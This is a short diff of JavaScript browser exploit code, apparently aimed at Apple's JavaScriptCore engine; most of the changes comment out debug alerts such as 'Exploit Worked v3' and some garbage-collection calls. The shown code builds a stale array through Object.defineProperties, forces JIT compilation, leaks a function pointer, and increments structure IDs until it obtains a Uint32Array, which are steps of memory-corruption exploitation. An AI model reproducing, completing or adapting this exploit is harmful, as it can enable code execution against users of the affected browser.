@@ -130,14 +130,14 @@ for (var i = 0; i < 0x1000; i++){
  	Object.defineProperties(target, props);
  	stale = target.stale;
  	
-	 
+	/*	 
 	if(before_len != stale.length){
-		alert("Exploit Worked v3");
+		//alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
 		document.location.reload();
 	}
-	 
+	*/
 	stale[0] += 0x101;
 	 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
@@ -159,7 +159,7 @@ for (var i = 0; i < 0x1000; i++){
 				//alert("Leaked function pointer:" + fcp)
 				
                        		
-				alert("Pushed stale");
+				//alert("Pushed stale");
 				bufs.push(stale);
 				stale[0] = fc;
                         	fcp = bufs[i][k];
@@ -190,6 +190,7 @@ for (var i = 0; i < 0x1000; i++){
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
 				
+				/*
 				dgc();
 				dgc();
 				dgc();
@@ -201,6 +202,7 @@ for (var i = 0; i < 0x1000; i++){
 				alert("sa.low=" + sa.low);
 				
 				alert("After accesing stale");
+				*/
 				while(!(stale[0] instanceof Uint32Array)) {
 				    alert("In while");
 				    structID++;
